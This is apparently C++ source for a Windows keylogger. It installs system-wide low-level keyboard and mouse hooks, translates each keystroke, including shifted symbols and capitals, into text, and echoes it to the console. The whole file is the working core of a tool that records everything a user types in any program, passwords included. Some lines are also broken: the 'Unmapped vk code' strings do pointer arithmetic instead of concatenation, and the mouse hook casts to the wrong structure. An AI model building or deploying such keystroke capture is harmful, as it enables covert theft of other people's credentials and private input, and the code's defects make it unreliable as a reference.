#include "stdafx.h"
#include <fstream>
#include <string>
#include <iostream>
#include <Windows.h>
#include <stdio.h>

using namespace std;

bool isCapsLockOn()
{
	if ((GetKeyState(VK_CAPITAL) & 1) != 0)
		return true;
	return false;
}

string getKeyString(DWORD vkCode)
{
	if (vkCode >= 0x30 && vkCode <= 0x39) // 0 - 9 with shift options
	{
		switch (vkCode)
		{
		case 0x30: if (GetAsyncKeyState(VK_SHIFT)) return ")"; return "0";
		case 0x31: if (GetAsyncKeyState(VK_SHIFT)) return "!"; return "1";
		case 0x32: if (GetAsyncKeyState(VK_SHIFT)) return "@"; return "2";
		case 0x33: if (GetAsyncKeyState(VK_SHIFT)) return "#"; return "3";
		case 0x34: if (GetAsyncKeyState(VK_SHIFT)) return "$"; return "4";
		case 0x35: if (GetAsyncKeyState(VK_SHIFT)) return "%"; return "5";
		case 0x36: if (GetAsyncKeyState(VK_SHIFT)) return "^"; return "6";
		case 0x37: if (GetAsyncKeyState(VK_SHIFT)) return "&"; return "7";
		case 0x38: if (GetAsyncKeyState(VK_SHIFT)) return "*"; return "8";
		case 0x39: if (GetAsyncKeyState(VK_SHIFT)) return "("; return "9";
		}
	}

	else if (vkCode >= 0x41 && vkCode <= 0x5A) // a - z
	{
		if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
			return string(1, (char)tolower(vkCode));
		return string(1, (char)vkCode);
	}

	else if (vkCode >= 0x60 && vkCode <= 0x69) // numpad numbers
	{
		return to_string(vkCode - 0x60);
	}

	else if (vkCode >= 0x6A && vkCode <= 0x6F) // numpad numbers
	{
		return string(1, (char)(vkCode - 0x40));
	}

	else if (vkCode >= 0x70 && vkCode <= 0x7B) // F1 - F12.
	{
		return  "[F" + to_string(vkCode - 111) + "]";
	}

	else if (vkCode >= 0xBA && vkCode <= 0xC0)
	{
		switch (vkCode)
		{
		case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) return ":"; return ";";
		case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) return "+"; return "=";
		case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) return "<"; return ",";
		case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) return "_"; return "-";
		case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) return ">"; return ".";
		case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) return "?"; return "/";
		case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) return "~"; return "`";
		}
	}

	else if (vkCode >= 0xDB && vkCode <= 0xDE)
	{
		switch (vkCode)
		{
		case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) return "{"; return "[";
		case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) return "|"; return "\\";
		case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) return "}"; return "]";
		case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) return "\""; return "'";
		}
	}

	else if (vkCode) // special
	{
		switch (vkCode)
		{
		case VK_LSHIFT:
		case VK_RSHIFT:
			break;
		case VK_RETURN: return "<ENTER>";
		case VK_CAPITAL: return "<CAPLOCK>";
		case VK_LCONTROL: return "<LCTRL>";
		case VK_RCONTROL: return "<RCTRL>";
		case VK_INSERT: return "<INSERT>";
		case VK_END: return "<END>";
		case VK_PRINT: return "<PRINT>";
		case VK_DELETE: return "<DEL>";
		case VK_BACK: return "<BK>";
		case VK_LEFT: return "<LEFT>";
		case VK_RIGHT: return "<RIGHT>";
		case VK_UP: return "<UP>";
		case VK_DOWN: return "<DOWN>";
		case VK_SPACE: return " ";
		case VK_ESCAPE: return "<ESC>";
		case VK_TAB: return "<TAB>";
		case VK_LWIN: return "<LWIN>";
		case VK_RWIN: return "<RWIN>";
		default: return "<Unmapped vk code: " + vkCode + '>';
		}
	}
	return "<Unmapped vk code: " + vkCode + '>';
}

string getMouseString(WPARAM wParam)
{
	switch (wParam)
	{
	case WM_LBUTTONDOWN: return "<LMOUSE>";
	case WM_RBUTTONDOWN: return "<RMOUSE>";
	}
	return "";
}

void handleStream(string word)
{
	cout << word;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);

	if (wParam == WM_KEYDOWN)
	{
		handleStream(getKeyString(p->vkCode));
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);

	handleStream(getMouseString(wParam));

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
	HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);

	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(keyboard);
	UnhookWindowsHookEx(mouse);
}